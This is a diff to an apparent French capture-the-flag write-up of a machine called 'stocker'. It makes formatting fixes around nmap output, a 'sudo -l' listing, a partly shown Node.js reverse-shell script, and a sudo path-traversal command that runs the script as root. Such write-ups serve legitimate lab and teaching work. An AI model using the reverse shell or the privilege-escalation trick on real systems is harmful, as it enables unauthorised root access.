@@ -20,7 +20,7 @@ Host is up (0.17s latency).
 
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 3d12971d86bc161683608f4f06e6d54e (RSA)
 |   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
 |_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
@@ -227,7 +227,7 @@ Et résultat :
 
 ```sh
 angoose@stocker:~$ sudo -l
-[sudo] password for angoose: 
+[sudo] password for angoose:
 Matching Defaults entries for angoose on stocker:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
@@ -237,9 +237,9 @@ User angoose may run the following commands on stocker:
 
 ### Exploitation
 
-/tmp/shell.js
+`/tmp/shell.js`
 
-```node
+```js
 (function(){
     var net = require("net"),
         cp = require("child_process"),
@@ -253,6 +253,7 @@ User angoose may run the following commands on stocker:
     return /a/; // Prevents the Node.js application from crashing
 })();
 ```
+Puis :
 
 `sudo /usr/bin/node /usr/local/scripts/../../../../../../tmp/shell.js`
 
